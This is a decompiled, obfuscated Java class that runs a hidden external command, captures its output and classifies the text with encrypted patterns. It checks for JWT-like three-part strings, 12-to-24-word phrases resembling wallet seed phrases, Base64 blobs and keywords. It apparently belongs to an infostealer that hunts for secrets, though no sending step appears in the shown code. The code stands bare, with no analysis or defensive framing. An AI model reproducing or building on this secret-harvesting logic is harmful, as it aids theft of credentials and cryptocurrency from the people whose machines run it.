/*
 * Decompiled with CFR 0.152.
 */
package x;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.util.Base64;

public final class p {
    public static a a() {
        try {
            Object object;
            Object object2 = new ProcessBuilder($S.d(403), $S.d(404), $S.d(405), $S.d(406), $S.d(407));
            ((ProcessBuilder)object2).redirectErrorStream(true);
            object2 = ((ProcessBuilder)object2).start();
            StringBuilder stringBuilder = new StringBuilder();
            try (Object object3 = new BufferedReader(new InputStreamReader(((Process)object2).getInputStream(), $S.d(399)));){
                while ((object = ((BufferedReader)object3).readLine()) != null) {
                    stringBuilder.append((String)object).append("\n");
                }
            }
            ((Process)object2).waitFor();
            object3 = stringBuilder.toString().trim();
            if (((String)object3).isEmpty() || ((String)object3).length() < 4) {
                return null;
            }
            object = new a();
            new a().a = object3;
            ((a)object).b = p.a((String)object3);
            return object;
        }
        catch (Exception exception) {
            return null;
        }
    }

    private static String a(String string) {
        if (string.matches($S.d(408)) || string.matches($S.d(409))) {
            return $S.d(410);
        }
        if (string.matches($S.d(411))) {
            return $S.d(412);
        }
        if (string.split("\\.").length == 3 && string.matches($S.d(413))) {
            return $S.d(414);
        }
        if (string.matches($S.d(415))) {
            return $S.d(416);
        }
        Object object = string.split($S.d(417));
        if (((String[])object).length >= 12 && ((String[])object).length <= 24) {
            return $S.d(418);
        }
        try {
            byte[] byArray = Base64.getDecoder().decode(string);
            object = byArray;
            if (byArray.length > 10) {
                return $S.d(419);
            }
        }
        catch (Exception exception) {}
        object = string.toLowerCase();
        if (((String)object).contains($S.d(420)) || ((String)object).contains($S.d(421)) || ((String)object).contains($S.d(422)) || ((String)object).contains($S.d(423))) {
            return $S.d(424);
        }
        return $S.d(425);
    }

    public static final class a {
        public String a;
        public String b;
    }
}

